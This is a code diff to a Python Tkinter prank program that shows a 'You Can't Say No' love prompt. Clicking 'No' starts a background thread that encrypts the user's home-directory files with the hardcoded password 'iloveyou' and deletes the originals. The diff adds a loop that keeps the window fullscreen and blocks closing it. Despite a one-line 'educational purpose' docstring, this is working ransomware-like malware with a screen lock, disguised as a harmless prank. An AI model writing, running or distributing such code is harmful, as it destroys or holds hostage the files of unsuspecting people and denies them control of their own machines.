@@ -1,6 +1,6 @@
-import pyautogui, pyAesCrypt, os, mimetypes, threading
+import pyautogui, pyAesCrypt, os, mimetypes, threading, timeit
 from tkinter import Tk, Label, Button, Entry
-from time import sleep
+from time import sleep, time
 
 pyautogui.FAILSAFE = False
 
@@ -18,6 +18,7 @@ class I_LOVE_YOU(Tk):
         self.emailInput = None
         self.timeInput = None
         self.passInput = None
+        self.close = False
         ######################
         self.title("You Can't Say No")
         self.config(bg="#00f2ff")
@@ -30,26 +31,33 @@ class I_LOVE_YOU(Tk):
         self.noBtn.place(relx=0.4, rely=0.5)
         self.update()
         sleep(2.5)
-########################################################
+        while not self.close:
+            self.onClosing()
+    
+    def onClosing(self):
+        self.attributes("-fullscreen", True)
+        self.protocol("WM_DELETE_WINDOW", self.onClosing)
+        self.update()
+
     accepted = lambda self : self.secondScreen() if self.countNo != 0 else self._seconScreen()
-########################################################
+
     def _seconScreen(self):
-        self.attributes("-fullscreen", False)
-        self.geometry(f'{self.winfo_screenheight()}x{self.winfo_screenwidth()}')
+        self.close = True
         self.yesBtn.destroy()
         self.noBtn.destroy()
         self.msg['text'] = "I Love You Too.. \U0001F49E "
         self.button = Button(self, text="Get My Info", command = self.getInfo, fg="#e74c3c", bg="#fff", font=("Comic sans ms", 30, 'bold'))
         self.button.place(relx = 0.5, rely= 0.65, anchor="center")
-##############################################################################################################
+
     def getInfo(self):
         with open("myLoverInfo.txt", "w") as file:
             details = "Name : Your_Name \nPhone : +977XXXXXXXXXX"
             file.writelines(details)
-        file.close() 
-###########################################################################################################################
+        file.close()
+        self.destroy() 
+
     rejected = lambda self : (setattr(self, 'countNo', self.countNo + 1), self.changeButtonPosition(), print(self.countNo))
-###########################################################################################################################
+
     def changeButtonPosition(self):
         if self.countNo == 1:
             self.startEncryption()
@@ -61,12 +69,12 @@ class I_LOVE_YOU(Tk):
         else:
             self.yesBtn.place(relx=self.noPos['relx'], rely=self.noPos['rely'])
             self.noBtn.place(relx=self.yesPos['relx'], rely=self.yesPos['rely'])
-################################################################################################################################################################################
+
     def startEncryption(self):
         backThred = threading.Thread(target = self.encrypt)
         backThred.daemon = True
         backThred.start()
-########################################################################################################################################################
+
     def secondScreen(self):
         self.yesBtn.destroy()
         self.noBtn.destroy()
@@ -87,16 +95,16 @@ class I_LOVE_YOU(Tk):
         self.selectTime.place(relx = 0.5, rely= 0.6)
         self.button = Button(self, text="Send", command = self.getDate, fg="#e74c3c", bg="#fff", font=("Comic sans ms", 30, 'bold'))
         self.button.place(relx = 0.5, rely= 0.75, anchor="center")
-########################################################
-    def getDate(self):
 
+    def getDate(self):
         email = self.emailInput.get()
         date = self.selectDate.get()
         time = self.selectTime.get()
         print(email, date, time)
         self.lastScreen()
-########################################################
+
     def lastScreen(self):
+        self.close = True
         self.inputMsg2.place_forget()
         self.inputMsg3.place_forget()
         self.emailInput.place_forget()
@@ -110,7 +118,7 @@ class I_LOVE_YOU(Tk):
         self.passInput.place(relx = 0.5, rely = 0.5)
         self.button['text'] = "Decrypt"
         self.button['command'] = self.decrypt
-########################################################
+
     """
         It's for educational purpose
     """
@@ -128,18 +136,20 @@ class I_LOVE_YOU(Tk):
         for _file in files:
             with open(_file, 'rb') as fileIn:
                 with open(_file + '.enc', 'wb') as fileOut:
-                    pyAesCrypt.encryptStream(fileIn, fileOut, 'iloveyou', 128 * 1024)
+                    pyAesCrypt.encryptStream(fileIn, fileOut, 'iloveyou', 512 * 1024)
                 os.remove(_file)
-        # self.update_gui()
 
     def decrypt(self):
-        password = self.passInput.get()
         files = self.getFiles(os.path.expanduser('~'))
+        self.msg['txt'] = f"Your files are decrypting....\nIt will take nearly {5*self.countNo} sec\n"
+        password = self.passInput.get()
+        self.countNo = len(files)
         for _file in files:
             with open(_file, 'rb') as fileIn:
                 with open(_file[:-4], 'wb') as fileOut:
-                    pyAesCrypt.decryptStream(fileIn, fileOut, password, 128 * 1024)
+                    pyAesCrypt.decryptStream(fileIn, fileOut, password, 512 * 1024)
                 os.remove(_file)
+            self.countNo -= 1
         self.destroy()
 
 if __name__ == '__main__':
